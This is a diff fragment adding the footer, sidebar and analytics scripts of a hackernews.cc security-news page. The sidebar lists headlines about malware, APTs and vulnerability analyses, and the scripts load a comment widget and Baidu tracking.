+        window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); 
+    } else { 
+        var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); 
+    }})(); 
+</script>            
+<div id="ds-ssr" style="display:none">
+		            <ol id="commentlist">
+                            </ol>
+
+		    </div>
+      </section>
+      <!-- END .m-articles-wrapper -->
+    </div>
+    <!-- END .m-articles-outer-wrapper -->
+  
+    <aside class="m-sidebar-wrapper col2-r">
+      <div id="search-4" class="widget-container widget_search clearfix"><h4 class="widget-title">你想关注的</h4><form role="search" method="get" id="searchform" class="searchform" action="http://hackernews.cc/">
+				<div>
+					<label class="screen-reader-text" for="s">搜索：</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="搜索" />
+				</div>
+			</form></div><div id="wn_links-5" class="widget-container widget_wn_links clearfix"><h4 class="widget-title"><span class="footer-links-title">[创宇资讯]2020年8月26日</span></h4>			<div class="footer-link">
+				<ul>
+							
+					<li><a href="http://suo.im/6v8bKA" target="_blank">Palo Alto Networks宣布以2.65亿美元收购网络安全公司Crypsis Group</a></li>
+							
+					<li><a href="http://suo.im/5wYtXX" target="_blank">暗网巨头Empire Market关闭数日，是DDoS还是“退场骗局”？</a></li>
+							
+					<li><a href="http://suo.im/6nBYV3" target="_blank">廉价智能手机被发现预装了恶意程序</a></li>
+							
+					<li><a href="http://suo.im/5LWJ8z" target="_blank">iOS 开发者套件 Mintegral 被爆窃取点击广告收入</a></li>
+							
+					<li><a href="http://suo.im/5EqwmA" target="_blank">首个渗透到iOS生态系统的恶意SDK，秘密访问1000+iOS APP</a></li>
+							
+					<li><a href="http://suo.im/6g6deA" target="_blank">以法律和金融组织为目标的 DeathStalker APT</a></li>
+							
+					<li><a href="http://suo.im/5LWHoZ" target="_blank">CWE Top25漏洞榜单发布，跨站脚本跃居榜首</a></li>
+							
+					<li><a href="http://suo.im/613MJA" target="_blank">Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现</a></li>
+									</ul>
+			</div>
+			<!-- END .footer-link -->
+		</div><div id="rss-9" class="widget-container widget_rss clearfix"><h4 class="widget-title"><a class="rsswidget" href="https://paper.seebug.org/rss/"><img class="rss-widget-icon" style="border:0" width="14" height="14" src="http://hackernews.cc/wp-includes/images/rss.png" alt="RSS" /></a> <a class="rsswidget" href="https://paper.seebug.org/">Seebug 最新 Paper</a></h4><ul><li><a class='rsswidget' href='https://paper.seebug.org/1314/'>柠檬鸭加密矿工：针对云应用和 Linux</a></li><li><a class='rsswidget' href='https://paper.seebug.org/1313/'>代码审计从0到1 —— Centreon One-click To RCE</a></li><li><a class='rsswidget' href='https://paper.seebug.org/1312/'>以法律和金融组织为目标的 DeathStalker APT</a></li><li><a class='rsswidget' href='https://paper.seebug.org/1311/'>Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现</a></li><li><a class='rsswidget' href='https://paper.seebug.org/1308/'>QakBot 恶意文档活动引入两项新技术</a></li></ul></div>    </aside>
+    <!-- END .s-sidebar-wrapper -->
+
+  </div>
+  <!-- END .content -->				<footer class="footer-outer-wrapper">
+					<div class="footer-widget-wrapper clearfix">
+						<div class="footer-sidebar-r">
+													</div>
+						<div class="footer-sidebar-l">
+													</div>
+					</div>
+					<!-- END .footer-widget-wrapper -->
+					<div class="footer-copyright-wrapper">
+
+						<!--  END .footer-ad -->
+						<style type="text/css">
+						.footer-ad ul {
+							padding: 0;
+							margin: 10px 0 15px;
+						}
+						.footer-ad li,
+						.footer-ad a {
+							display: inline-block;
+						}
+						.footer-ad li {
+							padding: 0 10px;
+						}
+						.footer-ad img{
+							height: 14px;
+						}
+						</style>
+						<div class="footer-ad">
+							<ul>
+								<li><a target="_blank" href="https://www.knownsec.com?from=hkn0627"><image alt="知道创宇" src="http://hackernews.cc/wp-includes/images/knownsec.png"/></a></li>
+								<li><a target="_blank" href="http://kcon.knownsec.com?from=hkn0627"><image alt="KCon" src="http://hackernews.cc/wp-includes/images/kcon.png"/></a></li>
+								<li><a target="_blank" href="https://www.seebug.org?from=hkn0627"><image alt="Seebug" src="http://hackernews.cc/wp-includes/images/seebug.png"/></a></li>
+								<li><a target="_blank" href="https://www.zoomeye.org?from=hkn0627"><image alt="ZoomEye" src="http://hackernews.cc/wp-includes/images/zoomeye.png"/></a></li>
+								<li><a target="_blank" href="https://www.yunaq.com?from=hkn0627"><image alt="知道创宇云安全" src="http://hackernews.cc/wp-includes/images/yunaq.png"/></a></li>
+							</ul>
+						</div>
+
+						<div class="copyright">
+							<!-- Copyright © 2016 HackerNews.cc  | <a href="/sitemap.xml">Sitemap</a> -->
+							<!-- Copyright © 2016 HackerNews.cc | ICP备 10040895号-38 -->
+							Copyright ©  知道创宇 2016-2020 HackerNews.cc | <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010502034619">   京公网安备 11010502034619号</a>     <img alt="京ICP备10040895号" src="https://www.knownsec.com/static/dist/imgs/d0289dc0.beian.png" /><a target="_blank" href="http://www.beian.mii    t.gov.cn/">京ICP备10040895号</a>
+						
+						
+						</div>
+						<!-- 新增时间2016.10.09，操作者：xuhf -->
+						<div class="copyright">联系方式：hackernews#knownsec.com 公益翻译组</div>
+						<!-- end -->
+					</div>
+					<!-- END .footer-copyright-wrapper -->
+				</footer>
+				<!-- END .footer-outer-wrapper -->
+			</div>
+			<!-- END .main-outer-wrapper -->
+		</div>
+		<div id="back-top">
+			<i class="fa fa-angle-up"></i>
+		</div>
+		<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/bootstrap.min.js?ver=4.5.22'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/hoverIntent.js?ver=4.5.22'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/superfish.js?ver=4.5.22'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-content/themes/whatnew-wp/js/site.js?ver=4.5.22'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-includes/js/comment-reply.min.js?ver=4.5.22'></script>
+<script type='text/javascript' src='http://hackernews.cc/wp-includes/js/wp-embed.min.js?ver=4.5.22'></script>
+<!-- 百度流量统计 -->
+<!-- 新增时间2016.10.09，操作者：xuhf -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?8c9b318dc2f80dcd30268c99fc57d891";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- end -->
+<!-- 百度站长统计 -->
+<!-- 新增时间2016.10.21，操作者：xuhf -->
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<!-- end -->
+	</body>
+</html>
